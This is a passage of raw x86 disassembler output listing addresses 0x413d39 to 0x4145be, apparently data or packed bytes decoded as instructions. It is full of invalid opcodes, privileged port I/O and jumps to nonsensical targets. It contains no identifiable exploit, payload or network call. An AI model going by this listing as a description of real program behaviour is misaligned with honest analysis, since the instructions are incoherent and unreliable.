  413d39:	mov    ebx,0xeef7d4f8
  413d3e:	mov    edi,0xd0fdf4d4
  413d43:	shl    ecx,1
  413d45:	mov    ah,0xed
  413d47:	(bad)  
  413d49:	pop    es
  413d4a:	(bad)  
  413d4c:	(bad)  
  413d4d:	(bad)
  413d50:	fiadd  DWORD PTR [eax+ecx*8]
  413d53:	iret   
  413d54:	in     eax,0xe2
  413d56:	ror    ebp,0xb1
  413d59:	in     eax,0xd0
  413d5b:	div    BYTE PTR [ecx+ebx*8-0x70d2e01]
  413d62:	int3   
  413d63:	clc    
  413d64:	mov    edi,0xe001f6f0
  413d69:	in     eax,0xc3
  413d6b:	loope  0x413d3c
  413d6d:	fsubr  st(5),st
  413d6f:	in     eax,dx
  413d70:	cld    
  413d71:	add    edx,esp
  413d73:	rol    bl,1
  413d75:	loopne 0x413d5f
  413d77:	mov    dh,0xd2
  413d79:	rol    ah,0xe5
  413d7c:	jmp    0xb6103b5b
  413d81:	(bad)  
  413d82:	in     eax,dx
  413d83:	loopne 0x413d88
  413d85:	(bad)  
  413d86:	stc    
  413d87:	sar    edi,0xe7
  413d8a:	loop   0x413d69
  413d8c:	dec    ecx
  413d8e:	std    
  413d8f:	push   cs
  413d90:	in     eax,0xee
  413d92:	(bad)  
  413d94:	shl    ecx,0xd3
  413d97:	out    0xb7,eax
  413d99:	hlt    
  413d9a:	repnz rcl bl,1
  413d9d:	mov    eax,0xf2faccf6
  413da2:	fldz   
  413da4:	cli    
  413da5:	test   bl,0x5
  413da8:	fucom  st(0)
  413daa:	out    0xe4,al
  413dac:	iret   
  413dad:	pop    es
  413dae:	iret   
  413daf:	fimul  DWORD PTR [eax]
  413db1:	shr    edx,cl
  413db3:	rol    ebp,1
  413db5:	test   al,0xbc
  413db7:	iret   
  413db8:	in     al,dx
  413db9:	enter  0xb0d9,0xfb
  413dbd:	lods   al,BYTE PTR ds:[esi]
  413dbe:	iret   
  413dbf:	fmulp  st(3),st
  413dc1:	sar    BYTE PTR [esi-0xe390c10],cl
  413dc7:	mov    esp,0xd5f1f6e1
  413dcc:	rcr    al,0xe3
  413dcf:	or     eax,0xbfe2e1ee
  413dd4:	shr    al,1
  413dd6:	jmp    0xb9cf:0xcec2c8e2
  413ddd:	(bad)  
  413ddf:	mov    dh,0xb1
  413de1:	iret   
  413de2:	into   
  413de3:	out    0xf1,eax
  413de5:	mov    ebp,0xd6e503d4
  413dea:	(bad)  
  413dec:	loop   0x413df8
  413dee:	leave  
  413def:	add    ch,bl
  413df1:	int    0xe5
  413df3:	ret    
  413df4:	fdiv   QWORD PTR [esi-0x1609112c]
  413dfa:	clc    
  413dfb:	sti    
  413dfc:	clc    
  413dfd:	jmp    0x413ded
  413dff:	fdivr  DWORD PTR [ebx-0x2e0a4501]
  413e05:	loope  0x413dc8
  413e07:	aam    0xfc
  413e09:	sti    
  413e0a:	std    
  413e0b:	(bad)  
  413e0c:	retf   0x907
  413e0f:	out    dx,al
  413e10:	out    0xf2,al
  413e12:	retf   
  413e13:	loope  0x413dd2
  413e15:	mov    cl,0xe6
  413e17:	mov    cl,0xd0
  413e19:	(bad)  
  413e1a:	mov    dh,0xd8
  413e1c:	out    0xcb,eax
  413e1e:	imul   dl
  413e20:	(bad)  
  413e21:	idiv   DWORD PTR [edi-0xc470ffd]
  413e27:	rol    BYTE PTR [edx+ecx*1],0x5
  413e2b:	cli    
  413e2c:	cli    
  413e2d:	in     eax,0xce
  413e2f:	call   0xea011b3e
  413e34:	out    dx,eax
  413e35:	loope  0x413e04
  413e37:	retf   0xd4fb
  413e3a:	fcmovne st,st(3)
  413e3c:	lods   eax,DWORD PTR ds:[esi]
  413e3d:	mov    al,0xf9
  413e3f:	ror    ecx,cl
  413e41:	(bad)  
  413e42:	in     eax,dx
  413e43:	fsubr  st,st(7)
  413e45:	int3   
  413e46:	cld    
  413e47:	(bad)  
  413e4a:	aad    0xdc
  413e4c:	(bad)  
  413e4d:	in     al,0xdc
  413e4f:	loop   0x413e1f
  413e51:	jecxz  0x413e35
  413e53:	enter  0xd0cc,0xb5
  413e57:	in     eax,0xc8
  413e59:	(bad)  
  413e5a:	in     eax,dx
  413e5b:	mov    ch,0xf4
  413e5d:	mov    eax,0xccbeeedc
  413e62:	int3   
  413e63:	mov    eax,0xf4e5d9dd
  413e68:	idiv   dl
  413e6a:	retf   0xff0b
  413e6d:	fsub   st(3),st
  413e6f:	loope  0x413e7c
  413e71:	in     eax,dx
  413e72:	out    0xee,eax
  413e74:	in     eax,0xbe
  413e76:	aad    0xe8
  413e78:	rcr    cl,0xe6
  413e7b:	retf   
  413e7c:	(bad)  
  413e7d:	fcmovnb st,st(5)
  413e7f:	aad    0xdc
  413e81:	iret   
  413e82:	add    dl,al
  413e84:	rcl    ebx,1
  413e86:	(bad)  
  413e88:	stc    
  413e89:	fucomp st(2)
  413e8b:	test   DWORD PTR [ecx],0xfc0d0de9
  413e91:	add    eax,0xaef0b8a9
  413e96:	mov    al,0xce
  413e98:	enter  0xc5e2,0xc0
  413e9c:	mov    cl,0xce
  413e9e:	aad    0xe4
  413ea0:	repz fidivr DWORD PTR [esi-0x1e074a47]
  413ea7:	rol    BYTE PTR [eax],0xf4
  413eaa:	call   0xee0a22a4
  413eaf:	enter  0xe502,0xdc
  413eb3:	shl    eax,0xcd
  413eb6:	(bad)  
  413eb7:	sar    bl,1
  413eb9:	mov    bl,0xc5
  413ebb:	aad    0xf9
  413ebd:	cmc    
  413ebe:	retf   0xc8b6
  413ec1:	hlt    
  413ec2:	repnz mov eax,0xe707f0fb
  413ec8:	(bad)  
  413eca:	retf   0xf806
  413ecd:	out    dx,al
  413ece:	jmp    0xe3ce:0xcdfcccfd
  413ed5:	(bad)  
  413ed6:	loopne 0x413ecf
  413ed8:	out    dx,eax
  413ed9:	repnz (bad) 
  413edc:	aad    0xd6
  413ede:	int3   
  413edf:	cmc    
  413ee0:	aam    0xf3
  413ee2:	loop   0x413ebc
  413ee4:	mov    ch,0x0
  413ee6:	in     al,dx
  413ee7:	fcmovnu st,st(1)
  413ee9:	(bad)  
  413eeb:	clc    
  413eec:	or     al,ah
  413eee:	out    dx,al
  413eef:	(bad)  
  413ef0:	(bad)  
  413ef2:	mov    dl,0xe3
  413ef4:	lods   eax,DWORD PTR ds:[esi]
  413ef5:	jmp    0xc7c7:0xcef4e3cf
  413efc:	mov    cl,0xd7
  413efe:	fmul   st(7),st
  413f00:	mov    ch,0xfd
  413f02:	leave  
  413f03:	mov    esp,0xecf6e2f1
  413f08:	ffreep st(4)
  413f0a:	(bad)  
  413f0c:	push   es
  413f0d:	jmp    0xc3e3:0xccfae5f8
  413f14:	xlat   BYTE PTR ds:[ebx]
  413f15:	loop   0x413ee1
  413f17:	mov    dl,0xe9
  413f19:	shr    esi,cl
  413f1b:	mov    dl,0xff
  413f1d:	(bad)  
  413f1f:	mov    edi,0xfcf0f2c3
  413f24:	icebp  
  413f25:	mov    esp,0xfff2fdbf
  413f2a:	or     BYTE PTR [ecx],al
  413f2c:	fadd   DWORD PTR [esi]
  413f2e:	push   cs
  413f2f:	fxam   
  413f31:	int    0xa9
  413f33:	fcomp  st(7)
  413f35:	jmp    0xeacb:0xa8f6bce7
  413f3c:	into   
  413f3d:	(bad)
  413f40:	fxch   st(2)
  413f42:	mov    esp,0x202fef4
  413f47:	out    0xdc,eax
  413f49:	lock cli 
  413f4b:	add    ebx,esp
  413f4d:	or     esp,ecx
  413f4f:	cld    
  413f50:	call   0xb039113c
  413f55:	out    dx,al
  413f56:	shr    ebx,1
  413f58:	retf   0xe4da
  413f5b:	icebp  
  413f5c:	int3   
  413f5d:	std    
  413f5e:	(bad)  
  413f5f:	into   
  413f60:	into   
  413f61:	(bad)  
  413f63:	icebp  
  413f64:	into   
  413f65:	mov    eax,0xc1d4dae0
  413f6a:	in     eax,0xe2
  413f6c:	jmp    0xd2f1:0xca08c407
  413f73:	loope  0x413f62
  413f75:	lods   eax,DWORD PTR ds:[esi]
  413f76:	retf   0xc0ef
  413f79:	shr    ch,1
  413f7b:	mov    dh,0xf3
  413f7d:	(bad)  
  413f7e:	iret   
  413f7f:	mov    ah,0xc9
  413f81:	iret   
  413f82:	repz cli 
  413f84:	ret    0xe201
  413f87:	jmp    0x413f73
  413f89:	shl    ah,cl
  413f8b:	shl    esp,0xee
  413f8e:	loopne 0x413f52
  413f90:	or     eax,0xa5c8c5ed
  413f95:	ror    esp,1
  413f97:	fmul   st(1),st
  413f99:	in     eax,0xaf
  413f9b:	fcmovbe st,st(6)
  413f9d:	(bad)  
  413f9e:	retf   0xfcfb
  413fa1:	in     al,dx
  413fa2:	(bad)  
  413fa4:	out    0xdb,eax
  413fa6:	in     al,dx
  413fa7:	repnz cli 
  413fa9:	aam    0xb
  413fab:	pop    es
  413fac:	add    ch,dh
  413fae:	(bad)
  413fb1:	jmp    0x413fa5
  413fb3:	scas   eax,DWORD PTR es:[edi]
  413fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb5:	shl    eax,0xac
  413fb8:	aam    0xac
  413fba:	iret   
  413fbb:	retf   
  413fbc:	in     eax,0xec
  413fbe:	mov    esi,0xf0fef9cd
  413fc3:	loop   0x413f9f
  413fc5:	fnclex 
  413fc7:	not    edx
  413fc9:	rcr    ch,1
  413fcb:	push   es
  413fcc:	fucom  st(5)
  413fce:	sti    
  413fcf:	in     al,0x13
  413fd1:	int    0xbf
  413fd3:	rol    bh,0xf5
  413fd6:	leave  
  413fd7:	into   
  413fd8:	int    0xd1
  413fda:	jmp    0xfdd3:0xd9c5d6ff
  413fe1:	clc    
  413fe2:	icebp  
  413fe3:	out    dx,eax
  413fe4:	repz hlt 
  413fe6:	rol    DWORD PTR [edi],0xc7
  413fe9:	or     edx,eax
  413feb:	rcl    ch,1
  413fed:	fxch   st(0)
  413fef:	(bad)  
  413ff0:	jmp    0x414000
  413ff2:	fidiv  WORD PTR [ebx-0x160e5124]
  413ff8:	shl    esi,0xc4
  413ffb:	leave  
  413ffc:	icebp  
  413ffd:	mov    edi,0xdcf6d1ce
  414002:	repz mov ecx,0x3c3d200
  414008:	rol    esi,1
  41400a:	hlt    
  41400b:	(bad)  
  41400c:	(bad)  
  41400d:	retf   
  41400e:	cli    
  41400f:	fmul   DWORD PTR [ecx]
  414011:	loopne 0x413fde
  414013:	shl    esp,1
  414015:	in     al,0xd4
  414017:	rcl    edx,cl
  414019:	(bad)  
  41401b:	leave  
  41401c:	div    ebx
  41401e:	sti    
  41401f:	mov    ebx,0xe2e3d0ec
  414024:	(bad)  
  414025:	in     al,dx
  414026:	xlat   BYTE PTR ds:[ebx]
  414027:	stc    
  414028:	ret    0xfdc5
  41402b:	faddp  st(0),st
  41402d:	add    al,0xee
  41402f:	(bad)  
  414031:	repz shl ebp,cl
  414034:	xlat   BYTE PTR ds:[ebx]
  414035:	iret   
  414036:	int    0xcb
  414038:	retf   0xdac9
  41403b:	mov    ch,0xd8
  41403d:	repnz retf 
  41403f:	mov    ebp,0xe8e2d6ff
  414044:	loop   0x41402c
  414046:	rcr    dh,0xf3
  414049:	stc    
  41404a:	jmp    0xf8e5:0xcfc8fac8
  414051:	enter  0xaac9,0xc0
  414055:	lock int 0xf3
  414058:	(bad)  
  41405a:	aad    0xb6
  41405c:	shl    BYTE PTR [ebp-0x410f0b2f],cl
  414062:	fsubr  st,st(6)
  414064:	mov    esp,0xffc1dacd
  414069:	rcr    bh,cl
  41406b:	ffreep st(7)
  41406d:	call   0xe549065f
  414072:	loop   0x414038
  414074:	ret    
  414075:	rcl    edi,1
  414077:	lods   eax,DWORD PTR ds:[esi]
  414078:	mov    al,0xca
  41407a:	aam    0xeb
  41407c:	int3   
  41407d:	mov    eax,0xd1b5fed1
  414082:	inc    dl
  414084:	(bad)  
  414086:	push   es
  414087:	icebp  
  414088:	or     dl,dl
  41408a:	xlat   BYTE PTR ds:[ebx]
  41408b:	leave  
  41408c:	retf   
  41408d:	loope  0x41408b
  41408f:	add    ecx,ebp
  414091:	ffreep st(6)
  414093:	shr    DWORD PTR [ebp-0x100d3639],cl
  414099:	mov    ecx,0xb8ecf4f5
  41409f:	fcomip st,st(7)
  4140a1:	call   0xed0e3f9e
  4140a6:	add    bl,cl
  4140a8:	out    0x4,al
  4140aa:	lock leave 
  4140ac:	or     eax,DWORD PTR [esi]
  4140ae:	cld    
  4140af:	(bad)  
  4140b1:	in     eax,dx
  4140b2:	shr    DWORD PTR [edi-0x4e39122e],1
  4140b8:	loope  0x4140b5
  4140ba:	ror    eax,0xed
  4140bd:	enter  0x3d4,0xee
  4140c1:	loop   0x4140bf
  4140c3:	into   
  4140c4:	rcr    ah,0xc6
  4140c7:	mov    edx,0xdbd9d0
  4140cc:	fsubr  st,st(6)
  4140ce:	call   0xd21b27db
  4140d3:	scas   eax,DWORD PTR es:[edi]
  4140d4:	mov    dl,0xb2
  4140d6:	rcl    bh,0xf7
  4140d9:	mov    cl,0xbb
  4140db:	int    0xd6
  4140dd:	aad    0xeb
  4140df:	in     al,0xd8
  4140e1:	retf   0xbcf9
  4140e4:	std    
  4140e5:	loop   0x4140e2
  4140e7:	jecxz  0x4140b9
  4140e9:	hlt    
  4140ea:	leave  
  4140eb:	fninit 
  4140ed:	out    0xd5,al
  4140ef:	fsub   st,st(0)
  4140f1:	jmp    0xf1f8edb3
  4140f6:	neg    ah
  4140f8:	jmp    0xead5:0xdfbbb1b6
  4140ff:	repnz shr eax,cl
  414102:	add    cl,al
  414104:	rol    BYTE PTR [esi],cl
  414106:	push   es
  414107:	mov    edx,0xad00507
  41410c:	psrad  mm7,mm6
  41410f:	push   es
  414110:	add    eax,0xc8d1a90e
  414115:	into   
  414116:	(bad)
  414119:	mov    al,0xb7
  41411b:	mov    ah,0xcb
  41411d:	aad    0xbf
  41411f:	(bad)  
  414121:	(bad)  
  414122:	in     eax,dx
  414123:	fcompp 
  414125:	fdiv   st,st(0)
  414127:	icebp  
  414128:	ret    0xca07
  41412b:	rcl    edi,0xcb
  41412e:	cld    
  41412f:	(bad)  
  414131:	(bad)  
  414132:	scas   eax,DWORD PTR es:[edi]
  414133:	mov    dl,0xc9
  414135:	rol    esi,1
  414137:	retf   
  414138:	mov    bl,0xea
  41413a:	in     eax,0xd2
  41413c:	in     eax,dx
  41413d:	lock in al,0xf4
  414140:	repz (bad) 
  414142:	call   0xfa024345
  414147:	cmc    
  414148:	fstp   st(0)
  41414a:	push   es
  41414b:	cld    
  41414c:	(bad)  
  41414d:	or     bh,al
  41414f:	enter  0x12cb,0xe3
  414153:	lods   eax,DWORD PTR ds:[esi]
  414154:	shr    DWORD PTR [ebp-0x32081332],cl
  41415a:	stc    
  41415b:	div    edi
  41415d:	hlt    
  41415e:	mov    dh,0xf1
  414160:	leave  
  414161:	mov    al,0xe2
  414163:	xlat   BYTE PTR ds:[ebx]
  414164:	rcl    esp,0x2
  414167:	(bad)  
  414169:	jecxz  0x414134
  41416b:	sti    
  41416c:	jmp    edi
  41416e:	out    dx,eax
  41416f:	cli    
  414170:	or     BYTE PTR [ecx],dl
  414172:	iret   
  414173:	test   al,0xc0
  414175:	test   dh,0xaa
  414178:	mov    dh,0xc2
  41417a:	shr    eax,1
  41417c:	in     eax,0xd7
  41417e:	fnstenv [edx-0x12254518]
  414184:	cmc    
  414185:	sar    BYTE PTR [edx+ebx*8-0x1615012c],0xc7
  41418d:	leave  
  41418e:	loope  0x41419d
  414190:	repz adc edi,esp
  414193:	mov    edi,0xd5f0ded3
  414198:	(bad)  
  414199:	fcmovu st,st(3)
  41419b:	mov    dl,0xe7
  41419d:	div    ebx
  41419f:	mov    edx,0xecffddf0
  4141a4:	mov    DWORD PTR [eax],0xfecbfcdd
  4141aa:	push   es
  4141ab:	leave  
  4141ac:	loop   0x414172
  4141ae:	loop   0x41419f
  4141b0:	push   cs
  4141b1:	add    esp,ebx
  4141b3:	repnz repnz in eax,0xca
  4141b7:	fdivr  st(5),st
  4141b9:	mov    ch,0xe4
  4141bb:	in     al,dx
  4141bc:	fsubr  st,st(6)
  4141be:	(bad)  
  4141bf:	mov    esp,0xddfad2eb
  4141c4:	lock ror ebp,1
  4141c7:	aam    0xf5
  4141c9:	fldl2e 
  4141cb:	(bad)  
  4141cc:	or     dh,ch
  4141ce:	add    al,0xf4
  4141d0:	cli    
  4141d1:	add    BYTE PTR [eax+eax*8-0x10422822],ch
  4141d8:	(bad)  
  4141d9:	fcmovbe st,st(0)
  4141db:	mov    dh,0xfe
  4141dd:	mov    ebx,0xf7f0e3ef
  4141e2:	rol    DWORD PTR [ecx],1
  4141e4:	repnz fcom st(5)
  4141e7:	shr    dl,1
  4141e9:	out    0xf5,al
  4141eb:	fisttp DWORD PTR [esi]
  4141ed:	push   cs
  4141ee:	iret   
  4141ef:	or     eax,0xf0ece1dc
  4141f4:	out    0xb1,eax
  4141f6:	mov    ch,0xe5
  4141f8:	cmc    
  4141f9:	out    0xd8,eax
  4141fb:	int    0xbb
  4141fd:	sar    BYTE PTR [eax-0x10332637],cl
  414203:	stc    
  414204:	(bad)  
  414206:	fdiv   st,st(7)
  414208:	test   DWORD PTR [ebx],0xeadc0ff4
  41420e:	iret   
  41420f:	or     DWORD PTR [edx],edx
  414211:	in     eax,dx
  414212:	(bad)  
  414213:	mov    esp,0xc0d5cbbf
  414218:	shl    BYTE PTR [edx-0xc4b070b],0xcc
  41421f:	mov    eax,0xfdd2d8cb
  414224:	repz std 
  414226:	add    cl,dl
  414228:	push   ecx
  41422a:	(bad)  
  41422b:	out    0xc4,eax
  41422d:	push   es
  41422e:	retf   0xcf0c
  414231:	clc    
  414232:	mov    bl,0xcc
  414234:	retf   
  414235:	mov    cl,0xab
  414237:	loopne 0x414225
  414239:	loope  0x414209
  41423b:	(bad)  
  41423d:	repz mov bl,0xf6
  414240:	mov    ebx,0xe7f9bbf3
  414245:	(bad)  
  414247:	std    
  414248:	mov    ecx,0xffd9f1de
  41424d:	(bad)  
  41424e:	in     al,0xe9
  414250:	sar    ebp,0xc2
  414253:	icebp  
  414254:	lds    ebp,FWORD PTR [ebp-0x4f4a1920]
  41425a:	cli    
  41425b:	sar    BYTE PTR [edi-0x10490618],cl
  414261:	(bad)  
  414263:	fadd   DWORD PTR [ecx]
  414265:	cld    
  414266:	out    0x0,al
  414268:	(bad)  
  414269:	jmp    0xcc0d:0xe8e0ffe7
  414270:	jmp    esp
  414272:	retf   
  414273:	fdiv   QWORD PTR [edi-0x312c5442]
  414279:	shl    ecx,cl
  41427b:	(bad)  
  41427d:	jmp    0xf32efc51
  414282:	iret   
  414283:	int3   
  414284:	add    DWORD PTR [ebx+eax*8+0x3c5dce1],esi
  41428b:	aam    0xf5
  41428d:	fld    DWORD PTR [ebx]
  41428f:	stc    
  414290:	add    ah,bh
  414292:	(bad)  
  414294:	mov    esp,0xe3b3b0c2
  414299:	(bad)  
  41429a:	mov    bh,0xcf
  41429c:	retf   0xcdb8
  41429f:	(bad)  
  4142a0:	fst    st(2)
  4142a2:	mov    eax,0xfae3d8e7
  4142a7:	jmp    0x41428b
  4142a9:	or     edx,eax
  4142ab:	(bad)  
  4142ac:	stc    
  4142ad:	(bad)  
  4142ae:	bswap  ebx
  4142b0:	out    0xcb,al
  4142b2:	shl    dl,0xe0
  4142b5:	(bad)  [ebx-0x3225054d]
  4142bb:	(bad)  
  4142bc:	sti    
  4142bd:	(bad)  
  4142bf:	sti    
  4142c0:	mov    ah,0xd2
  4142c2:	mov    ebx,0xe1f3ecf7
  4142c7:	add    al,bl
  4142c9:	stc    
  4142ca:	sar    esp,1
  4142cc:	add    al,0x5
  4142ce:	add    ebx,ebx
  4142d0:	fcmove st,st(6)
  4142d2:	mov    esi,0xebb3b0e4
  4142d7:	loop   0x4142ce
  4142d9:	rcl    bh,0xe4
  4142dc:	lods   eax,DWORD PTR ds:[esi]
  4142dd:	lods   al,BYTE PTR ds:[esi]
  4142de:	icebp  
  4142df:	out    dx,al
  4142e0:	std    
  4142e1:	iret   
  4142e2:	jecxz  0x4142c7
  4142e4:	clc    
  4142e5:	div    esp
  4142e7:	cmc    
  4142e8:	pop    es
  4142e9:	jmp    0xdfef:0xcecbfa0b
  4142f0:	add    edx,edx
  4142f2:	lock mov edi,0xc2c6c7ad
  4142f8:	loop   0x4142e5
  4142fa:	jmp    0xd7ee:0xe9cfdbc9
  414301:	mov    al,0xf3
  414303:	mov    eax,0x7fbfbe0
  414308:	fadd   DWORD PTR [edx]
  41430a:	(bad)  
  41430b:	call   0xf01d40f7
  414310:	fadd   QWORD PTR ds:0xb1c3d7ad
  414316:	(bad)  
  414318:	rcr    dl,0xe1
  41431b:	fnstcw WORD PTR [ebx-0x34234b30]
  414321:	enter  0x7ce,0xfe
  414325:	in     eax,0xdc
  414327:	(bad)  
  414328:	lock mov esp,0xf906cbbf
  41432e:	add    eax,0xace200f9
  414333:	leave  
  414334:	loope  0x414307
  414336:	in     al,dx
  414337:	in     eax,dx
  414338:	call   0xb2271729
  41433d:	out    0xb9,al
  41433f:	iret   
  414340:	sar    edx,1
  414342:	aam    0xb9
  414344:	mov    ch,0xf2
  414346:	add    bh,cl
  414348:	fisttp QWORD PTR [edx]
  41434a:	cmc    
  41434b:	add    al,0xc6
  41434d:	hlt    
  41434e:	or     ch,al
  414350:	fiadd  DWORD PTR [ebx]
  414352:	(bad)  
  414353:	test   eax,0xc2e2b2b0
  414358:	mov    cl,0xa8
  41435a:	mov    al,0xcd
  41435c:	out    dx,eax
  41435d:	repnz jmp 0xeef2:0xb8efd9d9
  414365:	fdivp  st(5),st
  414367:	loopne 0x41434a
  414369:	fdivr  DWORD PTR [edi-0x7fd162b]
  41436f:	leave  
  414370:	push   cs
  414371:	jmp    0xd5f3:0xe5e5a9e3
  414378:	rcl    al,1
  41437a:	jmp    0xe9f2:0xbaebf3f5
  414381:	aam    0xbe
  414383:	in     eax,dx
  414384:	rcl    ch,cl
  414386:	add    esp,ebx
  414388:	add    BYTE PTR [ecx],cl
  41438a:	add    edi,esp
  41438c:	shl    dl,0xd9
  41438f:	add    dh,ch
  414391:	jecxz  0x414351
  414393:	mov    cl,0xcf
  414395:	(bad)  
  414397:	mov    dl,0xc9
  414399:	lods   al,BYTE PTR ds:[esi]
  41439a:	mov    edx,0xd9e4c6c0
  41439f:	lock aam 0x3
  4143a2:	in     eax,dx
  4143a3:	mov    edx,0xd8f2eec1
  4143a8:	icebp  
  4143a9:	sar    al,1
  4143ab:	jecxz  0x41438e
  4143ad:	fadd   st(6),st
  4143af:	jmp    0xe3c4:0xdfcdebca
  4143b6:	fnsave [edx-0x20314833]
  4143bc:	fdivp  st(2),st
  4143be:	aad    0xd0
  4143c0:	repnz repz add DWORD PTR [esi-0x39282b1a],edi
  4143c8:	sti    
  4143c9:	rcr    ecx,0xdb
  4143cc:	xlat   BYTE PTR ds:[ebx]
  4143cd:	out    dx,al
  4143ce:	jmp    0xa8ea:0xe2ebcf0a
  4143d5:	int3   
  4143d6:	lods   al,BYTE PTR ds:[esi]
  4143d7:	(bad)  
  4143d8:	lock mov ah,0xd3
  4143db:	xbegin 0xf63e31cc
  4143e1:	cli    
  4143e2:	fucomip st,st(6)
  4143e4:	std    
  4143e5:	test   BYTE PTR [ebx],0xfc
  4143e8:	ret    0xdcfd
  4143eb:	(bad)  
  4143ec:	iret   
  4143ed:	jmp    0x70341d3
  4143f2:	les    esi,FWORD PTR [eax-0x3d135340]
  4143f8:	mov    ah,0xf7
  4143fa:	mov    dl,0xd3
  4143fc:	xlat   BYTE PTR ds:[ebx]
  4143fd:	repz rcl cl,1
  414400:	aam    0xbf
  414402:	cli    
  414403:	ret    
  414404:	sar    BYTE PTR [ebp-0x2b1e2bfa],cl
  41440a:	retf   0xe0f4
  41440d:	stc    
  41440e:	jecxz  0x4143dd
  414410:	jmp    0xc8280102
  414415:	lock rcl dh,0xb5
  414419:	aad    0xcb
  41441b:	in     eax,dx
  41441c:	in     al,0xf8
  41441e:	fucomip st,st(6)
  414420:	(bad)  
  414421:	loop   0x4143ff
  414423:	jecxz  0x4143fd
  414425:	cmc    
  414426:	icebp  
  414427:	(bad)  
  414428:	out    0xf4,eax
  41442a:	hlt    
  41442b:	retf   0xfdc5
  41442e:	int    0xfc
  414430:	fsub   st,st(3)
  414432:	shr    DWORD PTR [ecx-0x83c170d],1
  414438:	repz (bad) 
  41443a:	mov    bh,0xf2
  41443c:	mov    ah,0xd1
  41443e:	iret   
  41443f:	in     al,dx
  414440:	cli    
  414441:	fcom   st(5)
  414443:	loope  0x414422
  414445:	out    0xd6,eax
  414447:	loop   0x414402
  414449:	loop   0x414452
  41444b:	fcmovnu st,st(4)
  41444d:	loop   0x414444
  41444f:	fucomp st(7)
  414451:	(bad)  
  414452:	mov    esi,0xf1e5e3c9
  414457:	rcl    esp,1
  414459:	repnz in eax,0xd4
  41445c:	out    0xbe,al
  41445e:	repz in al,0xef
  414461:	repnz cmc 
  414463:	rcr    esi,1
  414465:	cld    
  414466:	jecxz  0x41445f
  414468:	rcl    ch,0xdc
  41446b:	call   0xea49223f
  414470:	loop   0x41445b
  414472:	out    0xe3,al
  414474:	loop   0x41443d
  414476:	shl    BYTE PTR [edi-0x2c0c2a38],cl
  41447c:	idiv   BYTE PTR [edi-0x262f1b02]
  414482:	iret   
  414483:	cld    
  414484:	into   
  414485:	ftst   
  414487:	hlt    
  414488:	mov    esp,0xfdcfef9
  41448d:	hlt    
  41448e:	les    ecx,FWORD PTR [edx]
  414490:	stc    
  414491:	(bad)  
  414492:	scas   al,BYTE PTR es:[edi]
  414493:	leave  
  414494:	(bad)  [esi-0x13561752]
  41449a:	(bad)  
  41449b:	out    dx,eax
  41449c:	ror    cl,1
  41449e:	std    
  41449f:	mov    ebp,0xbafbe1d0
  4144a4:	std    
  4144a5:	(bad)  
  4144a6:	cli    
  4144a7:	div    ebx
  4144a9:	loopne 0x414475
  4144ab:	jecxz  0x4144a8
  4144ad:	(bad)
  4144b1:	repnz fincstp 
  4144b4:	mov    edi,0xc4c4f0b1
  4144b9:	rcr    edx,cl
  4144bb:	iret   
  4144bc:	retf   
  4144bd:	aam    0xd4
  4144bf:	jmp    0x414472
  4144c1:	into   
  4144c2:	shl    bl,cl
  4144c4:	fldz   
  4144c6:	repnz mov edx,0xcbbf02ff
  4144cc:	call   0xee2927d8
  4144d1:	into   
  4144d2:	mov    ebp,0xc4d1c6d6
  4144d8:	in     eax,dx
  4144d9:	imul   ah
  4144db:	out    0xd4,eax
  4144dd:	enter  0xd0d3,0xf6
  4144e1:	test   esp,0xc7f4ccd2
  4144e7:	aam    0xdc
  4144e9:	xlat   BYTE PTR ds:[ebx]
  4144ea:	fild   DWORD PTR ds:0xdce2f9da
  4144f0:	or     al,0xdd
  4144f2:	shl    bl,0xd1
  4144f5:	lods   al,BYTE PTR ds:[esi]
  4144f6:	int    0xe2
  4144f8:	(bad)  
  4144f9:	repz fsubr st,st(2)
  4144fc:	(bad)  
  4144fd:	shl    ch,cl
  4144ff:	fcmovu st,st(1)
  414501:	icebp  
  414502:	call   0xf62e34de
  414507:	rcl    edi,1
  414509:	out    0x4,al
  41450b:	fiadd  DWORD PTR [ecx]
  41450d:	in     al,0xc9
  41450f:	fsubrp st(7),st
  414511:	add    BYTE PTR [esi-0x103e3f35],ch
  414517:	fucomi st,st(3)
  414519:	hlt    
  41451a:	loope  0x4144ca
  41451c:	(bad)  
  41451d:	out    dx,eax
  41451e:	fdiv   st(3),st
  414520:	retf   0xd7c8
  414523:	add    esi,ecx
  414525:	push   es
  414526:	rcr    edx,0xbd
  414529:	sti    
  41452a:	retf   
  41452b:	call   0xfd4c2e2a
  414530:	fsubr  st(5),st
  414532:	stos   DWORD PTR es:[edi],eax
  414533:	lock rcl bh,cl
  414536:	retf   
  414537:	out    0xc0,al
  414539:	mov    dh,0xf0
  41453b:	test   esi,0xdfeef5bf
  414541:	in     al,dx
  414542:	jmp    edi
  414544:	rcr    ch,0xdb
  414547:	int3   
  414548:	(bad)  
  414549:	(bad)  
  41454a:	out    0xe5,eax
  41454c:	cli    
  41454d:	loope  0x41454e
  41454f:	call   0xc921124d
  414554:	mov    bl,0xef
  414556:	mov    esp,0xf4b1f6f7
  41455b:	(bad)  
  41455d:	fdiv   DWORD PTR [ebx+0x1d4cbfb]
  414563:	mov    esi,0xf0cdd1d6
  414568:	fistp  QWORD PTR [eax+0x4d8fef7]
  41456e:	out    0xb,eax
  414570:	fcomi  st,st(2)
  414572:	out    0xc0,eax
  414574:	in     eax,0xb0
  414576:	aad    0xf7
  414578:	shr    eax,1
  41457a:	(bad)  
  41457b:	mov    dl,0xb8
  41457d:	(bad)  
  41457f:	fdivrp st(7),st
  414581:	int    0xc3
  414583:	out    0xe6,eax
  414585:	stc    
  414586:	frstpm(287 only) 
  414588:	shr    dl,0xc4
  41458b:	push   es
  41458c:	neg    ebp
  41458e:	push   cs
  41458f:	in     al,dx
  414590:	loop   0x414552
  414592:	int    0xe6
  414594:	(bad)  
  414595:	in     eax,dx
  414596:	enter  0xdbca,0xc1
  41459a:	(bad)
  41459d:	cmc    
  41459e:	xlat   BYTE PTR ds:[ebx]
  41459f:	in     al,dx
  4145a0:	retf   
  4145a1:	icebp  
  4145a2:	(bad)  
  4145a4:	xlat   BYTE PTR ds:[ebx]
  4145a5:	out    0xd0,al
  4145a7:	in     eax,0x2
  4145a9:	pop    es
  4145aa:	aad    0x9
  4145ac:	dec    BYTE PTR [edx]
  4145ae:	out    0xdb,al
  4145b0:	les    ecx,FWORD PTR [ebx]
  4145b2:	test   al,0xc7
  4145b4:	(bad)  
  4145b5:	aad    0xb7
  4145b7:	ror    edx,1
  4145b9:	mov    edx,0xd4efe6da
  4145be:	stc    
